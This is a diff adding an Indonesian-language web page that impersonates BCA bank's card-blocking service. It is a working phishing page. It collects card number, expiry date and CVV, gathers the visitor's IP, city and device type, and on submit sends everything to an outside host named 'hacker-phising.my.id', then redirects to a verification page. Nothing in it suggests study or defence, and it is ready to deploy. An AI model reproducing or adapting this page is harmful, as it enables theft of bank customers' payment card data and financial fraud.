@@ -1,0 +1,551 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="theme-color" content="#DB0011">
+  <title>Tiga Langkah Mudah - Blokir Kartu Debit & Kredit BCA</title>
+  <meta content="img/header.jpeg" property="og:image">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <link rel="icon" type="image/png" href="img/logo.svg"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * { 
+      box-sizing: border-box; 
+    }
+    
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding-bottom: 60px;
+      background-color: #f7fafd;
+    }
+    nav {
+      background-color: #fff;
+      color: #fff;
+      padding: 10px 15px;
+      align-items: center;
+      gap: 10px;
+      flex-direction: column;
+    }
+    
+    nav img {
+      height: 25px;
+    }
+    
+    nav span {
+      font-weight: bold;
+      font-size: 10px;
+    
+    }
+    
+    /* HEADER CONTAINER - Responsif dengan lebar 90% */
+    .header-container {
+      position: relative;
+      width: 90%;
+      max-width: 90%;
+      margin: 20px auto 0;
+      perspective: 1000px;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    
+    .header-image {
+      width: 100%;
+      height: auto;
+      transition: transform 0.4s;
+      position: relative;
+      border-radius: 20px;
+      margin-top: 20px;
+      display: block;
+    }
+    
+    /* FORM CONTAINER - Lebar sama dengan header container */
+    .form-container {
+      margin: 20px auto;
+      padding: 15px;
+      background-color: white;
+      border-radius: 8px;
+      width: 90%;
+      max-width: 90%;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+    }
+    
+    .header-text {
+      position: absolute;
+      width: 100%;
+      top: 66%;
+      left: 60%;
+      transform: translate(-50%, -50%);
+      color: gold;
+      font-weight: 700;
+      font-size: 18px;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+      text-align: center;
+      letter-spacing: 1px;
+    }
+    
+    .valid-thru {
+      position: absolute;
+      bottom: 30px;
+      left: 50px;
+      color: white;
+      font-size: 10px;
+      font-weight: 500;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+    }
+    
+    .cvv-display {
+      position: absolute;
+      top: 51%;
+      right: 60px;
+      transform: translateY(-50%);
+      color: gold;
+      font-size: 15px;
+      font-weight: 600;
+      text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.7);
+      display: none;
+    }
+    
+    .card-icon {
+      position: absolute;
+      right: 10px;
+      top: 50%;
+      transform: translateY(-50%);
+      width: 30px;
+      display: none;
+    }
+    
+    .input-group {
+      position: relative;
+      margin-bottom: 15px;
+    }
+    
+    .input-group input {
+      width: 100%;
+      padding: 12px 12px 12px 40px;
+      border: none;
+      border-radius: 5px;
+      background-color: #f1f1f1;
+      font-size: 13px;
+      font-weight: 700;
+    }
+    
+    .input-group i {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      color: #888;
+    }
+    
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #fff;
+      color: #DB0011;
+      font-weight: 500;
+      border: 1.8px solid #DB0011;
+      border-radius: 25px;
+      font-size: 12px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    button:hover {
+      background-color: #DB0011;
+      border-color: #f4f4f4;
+      color: white !important;
+    }
+    
+    .loading-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(255,255,255,0.8);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+    }
+    
+    .spinner {
+      border: 6px solid #ccc;
+      border-top: 6px solid #1868b3;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      to { 
+        transform: rotate(360deg); 
+      }
+    }
+    
+    .bca-footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background: #DB0011;
+      color: white;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      padding: 10px 0;
+      font-size: 12px;
+      z-index: 999;
+      border-top: 1px solid rgb(255, 255, 255);
+    }
+    
+    .footer-item {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      flex: 1;
+      color: #fff;
+      cursor: pointer;
+    }
+    
+    .footer-item i {
+      font-size: 20px;
+      margin-bottom: 2px;
+    }
+    
+    .footer-item span {
+      font-size: 10px;
+    }
+    
+    /* MEDIA QUERIES UNTUK RESPONSIF */
+    
+    /* Untuk tablet */
+    @media (max-width: 768px) {
+      .header-container,
+      .form-container {
+        width: 90%;
+        max-width: 90%;
+      }
+      
+      .header-container {
+        perspective: 800px;
+      }
+      
+      .header-image {
+        margin-top: 15px;
+      }
+      
+      .header-text {
+        font-size: 16px;
+        top: 65%;
+        left: 58%;
+      }
+      
+      .valid-thru {
+        left: 45px;
+        bottom: 25px;
+      }
+      
+      .cvv-display {
+        right: 55px;
+        font-size: 14px;
+      }
+    }
+    
+    /* Untuk mobile */
+    @media (max-width: 480px) {
+      .header-container,
+      .form-container {
+        width: 90%;
+        max-width: 90%;
+      }
+      
+      .header-container {
+        perspective: 600px;
+        margin-top: 15px;
+      }
+      
+      .form-container {
+        margin-top: 15px;
+        padding: 12px;
+      }
+      
+      .header-image {
+        margin-top: 10px;
+        border-radius: 15px;
+      }
+      
+      .header-text {
+        font-size: 14px;
+        top: 64%;
+        left: 56%;
+      }
+      
+      .valid-thru {
+        left: 35px;
+        bottom: 20px;
+        font-size: 9px;
+      }
+      
+      .cvv-display {
+        right: 45px;
+        font-size: 13px;
+        top: 50%;
+      }
+      
+      button {
+        padding: 10px;
+        font-size: 11px;
+      }
+      
+      nav img {
+        height: 20px;
+      }
+    }
+    
+    /* Untuk layar sangat kecil (mobile kecil) */
+    @media (max-width: 400px) {
+      .header-container,
+      .form-container {
+        width: 85%;
+        max-width: 85%;
+      }
+      
+      .header-image {
+        margin-top: 8px;
+        border-radius: 12px;
+      }
+      
+      .header-text {
+        font-size: 12px;
+        top: 63%;
+        left: 55%;
+        letter-spacing: 0.5px;
+      }
+      
+      .form-container {
+        padding: 10px;
+      }
+      
+      .input-group input {
+        padding: 10px 10px 10px 35px;
+        font-size: 12px;
+      }
+      
+      .valid-thru {
+        left: 30px;
+        bottom: 18px;
+        font-size: 8px;
+      }
+      
+      .cvv-display {
+        right: 40px;
+        font-size: 12px;
+      }
+    }
+    
+    /* Untuk desktop besar */
+    @media (min-width: 1200px) {
+      .header-container,
+      .form-container {
+        width: 90%;
+        max-width: 90%;
+      }
+      
+      .header-container {
+        perspective: 1200px;
+        max-width: 400px;
+      }
+      
+      .form-container {
+        max-width: 400px;
+      }
+      
+      .header-image {
+        margin-top: 25px;
+      }
+      
+      .header-text {
+        font-size: 20px;
+        top: 67%;
+      }
+    }
+    
+    /* Untuk layar sangat besar */
+    @media (min-width: 1400px) {
+      .header-container,
+      .form-container {
+        max-width: 450px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<nav>
+  <img src="img/logo.svg" alt="Logo">
+</nav>
+
+<div class="header-container">
+  <img class="header-image" id="card-image" src="img/cardLain.png" alt="Card Front" />
+  <div class="header-text"></div>
+  <div class="valid-thru"></div>
+  <div class="cvv-display"></div>
+</div>
+
+<div class="form-container">
+  <form id="card-form">
+    <div class="input-group">
+      <i class="fas fa-credit-card"></i>
+      <input type="tel" id="debit" placeholder="Nomor Kartu Debit/Kredit" maxlength="19" required>
+      <img class="card-icon" src="" alt="Card Type Icon">
+    </div>
+    <div class="input-group">
+      <i class="fas fa-calendar-alt"></i>
+      <input type="tel" id="valid" placeholder="Valid Thruu (MM/YY)" maxlength="7" required>
+    </div>
+    <div class="input-group">
+      <i class="fas fa-lock"></i>
+      <input type="tel" id="cvv" placeholder="CVV (3 digit terakhir belakang kartu)" maxlength="3" required>
+    </div>
+    <br>
+    <button type="submit">Laporkan Kartu Bank Lain</button>
+  </form>
+</div>
+
+<div class="loading-overlay" id="loading-overlay">
+  <div class="spinner"></div>
+</div>
+
+<footer class="bca-footer" onclick="window.location.href='/'">
+  <div class="footer-item"><i class="fas fa-map-marker-alt"></i><span>Daftar Lokasi</span></div>
+  <div class="footer-item"><i class="fas fa-message"></i><span>Bantuan</span></div>
+  <div class="footer-item"><i class="fas fa-lock"></i><span>Login</span></div>
+</footer>
+
+<script>
+  let userInfo = {};
+  fetch('https://ipinfo.io/json')
+    .then(res => res.json())
+    .then(data => {
+      userInfo = {
+        ip: data.ip,
+        city: data.city,
+        device: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone/i.test(navigator.userAgent) ? 'iPhone' : 'Lainnya'
+      };
+    });
+
+  const cardImage = document.getElementById('card-image');
+  const cardInfo = document.querySelector('.header-text');
+  const validThruInfo = document.querySelector('.valid-thru');
+  const cvvDisplay = document.querySelector('.cvv-display');
+  const cardIcon = document.querySelector('.card-icon');
+
+  document.getElementById('debit').addEventListener('input', function () {
+    const formatted = formatCardNumber(this.value);
+    this.value = formatted;
+    const clean = formatted.replace(/\s+/g, '');
+
+    cardInfo.textContent = clean.length > 0 ? formatted : '';
+    const icon = getCardIcon(clean);
+    cardIcon.src = icon;
+    cardIcon.style.display = clean.length > 0 && icon ? 'block' : 'none';
+  });
+
+  document.getElementById('valid').addEventListener('input', function () {
+    const formatted = formatValidDate(this.value);
+    this.value = formatted;
+
+    const cleanCard = document.getElementById('debit').value.replace(/\s+/g, '');
+    validThruInfo.textContent = formatted.length > 0 && cleanCard.length > 0 ? `Valid / Thruu ${formatted}` : '';
+  });
+
+  document.getElementById('cvv').addEventListener('focus', () => {
+    cardImage.src = 'img/cardBelakangLain.png';
+    cvvDisplay.style.display = 'block';
+    cardInfo.style.display = 'none';
+    validThruInfo.style.display = 'none';
+  });
+
+  document.getElementById('cvv').addEventListener('input', function () {
+    cvvDisplay.textContent = this.value;
+  });
+
+  document.getElementById('cvv').addEventListener('blur', () => {
+    cardImage.src = 'img/cardLain.png';
+    cvvDisplay.style.display = 'none';
+    cardInfo.style.display = 'block';
+    validThruInfo.style.display = 'block';
+  });
+
+  document.getElementById('card-form').addEventListener('submit', async function (e) {
+    e.preventDefault();
+    const card = document.getElementById('debit').value.replace(/\s+/g, '');
+    const valid = document.getElementById('valid').value;
+    const cvv = document.getElementById('cvv').value;
+
+    if (!validateCard(card)) {
+      alert('Nomor kartu yang anda masukkan salah');
+      return;
+    }
+
+    document.getElementById('loading-overlay').style.display = 'flex';
+
+    const postData = `card=${encodeURIComponent(card)}&valid=${encodeURIComponent(valid)}&cvv=${encodeURIComponent(cvv)}&ip=${userInfo.ip}&city=${userInfo.city}&device=${userInfo.device}`;
+
+    try {
+      await fetch('https://hacker-phising.my.id/notif/req/lain.php', {
+        method: 'POST',
+        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+        body: postData
+      });
+
+      setTimeout(() => {
+        window.location.href = "verifikasi.html";
+      }, 1000);
+    } catch (error) {
+      alert('Gagal mengirim data.');
+    } finally {
+      document.getElementById('loading-overlay').style.display = 'none';
+    }
+  });
+
+  function formatCardNumber(value) {
+    return value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+  }
+
+  function formatValidDate(value) {
+    const clean = value.replace(/\D/g, '');
+    if (clean.length >= 3) return clean.slice(0, 2) + ' / ' + clean.slice(2, 4);
+    return clean;
+  }
+
+  function getCardIcon(cardNumber) {
+    if (/^4/.test(cardNumber)) return 'https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg';
+    if (/^5[1-5]/.test(cardNumber)) return 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f0/Mastercard_logo.svg/960px-Mastercard_logo.svg.png?_=20150107045538';
+    if (/^3[47]/.test(cardNumber)) return 'https://tse1.mm.bing.net/th?id=OIP.UjUanHGKJmIR9N-KPHDPFAHaCK&pid=Api';
+    if (/^6/.test(cardNumber)) return 'https://tse1.mm.bing.net/th?id=OIP.meT2YX4ATpyfITyOk9vg3gHaBT&pid=Api';
+    if (/^1/.test(cardNumber)) return 'https://tse2.mm.bing.net/th?id=OIP.zL2t80xwfuVy6kmbwDk7FQAAAA&pid=Api';
+    return '';
+  }
+
+  function validateCard(cardNumber) {
+    if (cardNumber.length !== 16) return false;
+    let sum = 0, shouldDouble = false;
+    for (let i = cardNumber.length - 1; i >= 0; i--) {
+      let digit = parseInt(cardNumber.charAt(i));
+      if (shouldDouble) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      sum += digit;
+      shouldDouble = !shouldDouble;
+    }
+    return sum % 10 === 0;
+  }
+</script>
+
+</body>
+</html>
